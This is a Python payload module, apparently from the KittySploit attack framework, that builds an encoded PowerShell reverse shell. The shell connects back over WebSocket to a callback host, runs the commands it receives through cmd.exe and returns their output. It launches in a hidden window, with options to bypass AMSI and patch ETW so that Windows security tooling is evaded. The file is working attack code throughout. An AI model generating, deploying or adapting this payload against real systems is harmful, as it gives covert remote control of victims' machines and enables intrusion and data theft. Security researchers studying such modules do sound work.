from kittysploit import *
import base64


class Module(Payload):

	CLIENT_LANGUAGE = "powershell"

	__info__ = {
		"name": "PowerShell Reverse WebSocket Shell",
		"description": "Connect back over WebSocket (.NET ClientWebSocket) and run commands",
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/web/websocket",
		"handler": Handler.REVERSE,
		"session_type": SessionType.WEBSOCKET,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(8765, "Callback WebSocket port", True)
	path = OptString("/ws", "WebSocket path", False)
	use_ssl = OptBool(False, "Use wss://", False)
	bypass_amsi = OptBool(False, "Prepend AMSI bypass", False, True)
	patch_etw = OptBool(False, "Patch EtwEventWrite", False, True)

	def _build_script(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		path = str(self.path or "/ws").strip() or "/ws"
		if not path.startswith("/"):
			path = "/" + path
		scheme = "wss" if bool(self.use_ssl) else "ws"
		url = f"{scheme}://{host}:{port}{path}"

		return f"""
$ErrorActionPreference='Stop'
$u=[Uri]'{url}'
$ws=New-Object Net.WebSockets.ClientWebSocket
$cts=New-Object Threading.CancellationTokenSource
$ws.ConnectAsync($u,$cts.Token).Wait()
function Send-Text([string]$t){{
  $bytes=[Text.Encoding]::UTF8.GetBytes($t)
  $seg=New-Object ArraySegment[byte] -ArgumentList @(,$bytes)
  $ws.SendAsync($seg,[Net.WebSockets.WebSocketMessageType]::Text,$true,$cts.Token).Wait()
}}
function Recv-Text(){{
  $buf=New-Object byte[] 65536
  $seg=New-Object ArraySegment[byte] -ArgumentList @(,$buf)
  $ms=New-Object IO.MemoryStream
  do {{
    $r=$ws.ReceiveAsync($seg,$cts.Token).Result
    $ms.Write($buf,0,$r.Count)
  }} while(-not $r.EndOfMessage)
  if($r.MessageType -eq [Net.WebSockets.WebSocketMessageType]::Close){{ return $null }}
  return [Text.Encoding]::UTF8.GetString($ms.ToArray())
}}
Send-Text "KittySploit WebSocket shell ready`n"
while($ws.State -eq [Net.WebSockets.WebSocketState]::Open){{
  $cmd=Recv-Text
  if($null -eq $cmd){{ break }}
  $cmd=$cmd.Trim()
  if(-not $cmd){{ continue }}
  if($cmd -match '^(exit|quit)$'){{ break }}
  try {{
    $out=(cmd.exe /c $cmd 2>&1 | Out-String)
    if(-not $out){{ $out='[empty]' }}
  }} catch {{
    $out='ERROR:'+$_.Exception.Message
  }}
  Send-Text $out
}}
try {{ $ws.CloseAsync([Net.WebSockets.WebSocketCloseStatus]::NormalClosure,'bye',$cts.Token).Wait() }} catch {{}}
""".strip()

	def generate(self):
		from lib.c2.stager_evasion import powershell_prelude

		script = powershell_prelude(
			bypass_amsi=bool(self.bypass_amsi),
			patch_etw=bool(self.patch_etw),
		) + self._build_script()
		return self._encode_powershell_command(script, window_style="hidden")
